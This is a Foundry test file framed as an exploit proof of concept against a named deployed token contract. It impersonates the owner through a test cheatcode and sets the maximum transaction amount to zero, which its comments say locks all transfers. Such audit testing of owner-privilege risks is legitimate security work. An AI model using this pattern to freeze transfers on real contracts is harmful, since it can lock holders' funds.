pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface NowMeta {
    function owner() external view returns (address);
    function maxTxAmount() external view returns (uint256);
    function setMaxTxAmount(uint256 amount) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xfac45d4b406D94cddFC48b198839673351CB2Bf9;
    address attacker = address(this);
    NowMeta target;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = NowMeta(TARGET);
        owner = target.owner();
        vm.label(address(target), "NowMeta Contract");
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Impersonate the contract owner
        vm.startPrank(owner);

        // Step 2: Set maxTxAmount to 0, which will lock all transfers
        target.setMaxTxAmount(0);

        // Step 3: Stop impersonation
        vm.stopPrank();

        // Step 4: Verify the exploit succeeded - maxTxAmount should now be 0
        assertEq(target.maxTxAmount(), 0, "maxTxAmount should be 0 after exploit");
        assertEq(target.maxTxAmount(), 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

